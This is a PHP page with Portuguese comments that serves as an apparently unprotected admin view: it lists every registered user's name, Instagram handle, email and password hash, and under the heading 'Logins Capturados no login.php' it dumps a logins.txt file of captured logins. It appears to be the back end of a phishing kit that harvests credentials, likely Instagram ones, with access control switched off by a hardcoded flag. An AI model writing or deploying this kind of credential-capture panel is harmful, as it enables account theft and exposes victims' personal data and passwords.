<?php
require 'db.php';
session_start();

// Verificação simples para acesso (pode trocar por verificação por sessão depois)
$acesso_liberado = true; // Coloque false para bloquear

if (!$acesso_liberado) {
    echo "Acesso negado.";
    exit();
}

// Pega os usuários do banco de dados
$stmt = $pdo->query("SELECT nome, instagram, email, senha_hash, data_criacao FROM usuarios");
$usuarios = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>

<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Usuários Cadastrados</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <h1>👀 Lista de Usuários Cadastrados</h1>
        <table border="1" cellpadding="8" cellspacing="0" style="width:100%; color:white;">
            <tr>
                <th>Nome</th>
                <th>Instagram</th>
                <th>Email</th>
                <th>Senha (hash)</th>
                <th>Data Cadastro</th>
            </tr>
            <?php foreach ($usuarios as $user): ?>
            <tr>
                <td><?= htmlspecialchars($user['nome']) ?></td>
                <td><?= htmlspecialchars($user['instagram']) ?></td>
                <td><?= htmlspecialchars($user['email']) ?></td>
                <td><?= htmlspecialchars($user['senha_hash']) ?></td>
                <td><?= htmlspecialchars($user['data_criacao']) ?></td>
            </tr>
            <?php endforeach; ?>
        </table>

        <hr><br>
        <h2 style="color:#fff;">📂 Logins Capturados no login.php</h2>
        <pre style="background: #111; color: #0f0; padding: 10px; border-radius: 10px;">
<?php
$logins = 'logins.txt';
if (file_exists($logins)) {
    echo htmlspecialchars(file_get_contents($logins));
} else {
    echo "Arquivo logins.txt não encontrado.";
}
?>
        </pre>

        <br><a href="dashboard.php" class="btn-voltar">🔙 Voltar</a>
    </div>
</body>
</html>
